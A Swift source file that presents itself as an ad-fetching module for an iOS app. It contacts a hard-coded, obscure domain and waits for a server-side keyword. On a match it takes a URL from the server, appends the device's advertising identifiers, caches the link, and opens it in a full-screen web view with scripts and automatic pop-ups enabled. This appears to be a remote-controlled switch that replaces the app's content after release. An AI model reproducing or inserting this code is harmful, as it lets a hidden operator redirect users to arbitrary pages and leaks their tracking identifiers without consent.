// The Swift Programming Language
// https://docs.swift.org/swift-book
import UIKit
import WebKit

public class AdWebViewController: UIViewController {
    
    private var adWebView: WKWebView!
    private var adUrl: URL
    
    public let netAlert = UIAlertController(title: "The connection problems!",
                                            message: "To continue, you should be connected",
                                            preferredStyle: .alert)
    
    private var topConstraint: NSLayoutConstraint?
    
    public init(url: URL) {
        self.adUrl = url
        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    override public var prefersStatusBarHidden: Bool {
        return true
    }
    
    private func configWebView() -> WKWebViewConfiguration {
        let configuration = WKWebViewConfiguration()
        configuration.preferences.javaScriptEnabled = true
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        return configuration
    }
    
    private func setUp() {
        view.backgroundColor = .black
        
        adWebView = WKWebView(frame: view.bounds, configuration: configWebView())
        adWebView.translatesAutoresizingMaskIntoConstraints = false
        adWebView.navigationDelegate = self
        view.addSubview(adWebView)
        
        NSLayoutConstraint.activate([
            adWebView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            adWebView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            adWebView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        
        topConstraint = adWebView.topAnchor.constraint(equalTo: view.topAnchor, constant: 70)
        topConstraint!.isActive = true
        
        let request = URLRequest(url: adUrl)
        adWebView.load(request)
    }
    
    func showNetPopUp() {
        present(netAlert, animated: true, completion: nil)
    }
    
    func hideNetPopUp() {
        netAlert.dismiss(animated: true)
    }
    
    func checkInternetConnection() {
        let monitor = NWPathMonitor()
        monitor.pathUpdateHandler = { path in
            if path.status == .satisfied {
                DispatchQueue.main.async {
                    self.hideNetPopUp()
                }
            } else {
                DispatchQueue.main.async {
                    self.showNetPopUp()
                }
            }
        }
        let queue = DispatchQueue(label: "NetworkMonitor")
        monitor.start(queue: queue)
    }
    
    override public func didRotate(from fromInterfaceOrientation: UIInterfaceOrientation) {
        super.didRotate(from: fromInterfaceOrientation)
        topConstraint?.constant = self.view.frame.size.height > self.view.frame.size.width ? 70 : 0
        view.updateConstraintsIfNeeded()
    }
    
    override public func viewDidLoad() {
        super.viewDidLoad()
        setUp()
        checkInternetConnection()
    }
}

extension AdWebViewController: WKNavigationDelegate {
    public func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        //        print("Finished loading: \(url)")
    }
    
    public func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        //        print("Failed to load: \(url), error: \(error.localizedDescription)")
    }
}

import WebKit

public final class AdFetcher {
    
    public init() {}
    
    private func check(url: String, completion: @escaping (Result<Data, ClientError>) -> Void) {
        self.makeRequest(url: url, completion: completion)
    }
    
    public func makeRequest(url: String, completion: @escaping (Result<Data, ClientError>) -> Void) {
        let url = URL(string: url)!
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        let session: URLSession = {
            let session = URLSession(configuration: .default)
            session.configuration.timeoutIntervalForRequest = 10.0
            return session
        }()
        let task = session.dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode != 200 {
                completion(.failure(.httpError(httpResponse.statusCode)))
                return
            }
            guard error == nil, let data = data else {
                completion(.failure(.responseError))
                return
            }
            
            completion(.success(data))
        }
        task.resume()
    }
    
    public func fetchAd(appsId: String,
                                idfa: String,
                                extraInfo: String,
                                completion: @escaping (String) -> Void) {
        var resultedString = UserDefaults.standard.string(forKey: "advert")
        if let validResultedString = resultedString {
            completion(validResultedString)
            return
        }
        
        let source = "https://mioporafauopot.homes/beorespici"
        let user = "citopa"
        
        self.check(url: source) { result in
            let gaid = appsId
            let idfa = idfa
            switch result {
            case .success(let data):
                let responseString = String(data: data, encoding: .utf8) ?? ""
                if responseString.contains(user) {
                    if extraInfo != "" {
                        let link = "\(responseString)?idfa=\(idfa)&gaid=\(gaid)\(extraInfo)"
                        resultedString = link
                        UserDefaults.standard.setValue(link, forKey: "advert")
                        completion(link)
                    }
                    else {
                        let link = "\(responseString)?idfa=\(idfa)&gaid=\(gaid)"
                        resultedString = link
                        UserDefaults.standard.setValue(link, forKey: "advert")
                        completion(link)
                    }
                } else {
                    completion(resultedString ?? "")
                }
            case .failure(_):
                DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
                    completion(resultedString ?? "")
                }
            }
        }
    }
    
    public func fetchAndPresentAd(from viewController: UIViewController,
                                  appsId: String,
                                  idfa: String,
                                  extraIfo: String,
                                  completion: @escaping (Bool) -> Void) {
        fetchAd(appsId: appsId, idfa: idfa, extraInfo: extraIfo) { [weak self] urlString in
            
            if !urlString.isEmpty, let url = URL(string: urlString) {
                DispatchQueue.main.async {
                    let webViewController = AdWebViewController(url: url)
                    webViewController.modalPresentationStyle = .fullScreen
                    viewController.present(webViewController, animated: true, completion: nil)
                    completion(true)
                }
            } else {
                completion(false)
            }
        }
    }
}

public enum ClientError: Error {
    case responseError
    case noDataError
    case httpError(Int)
}
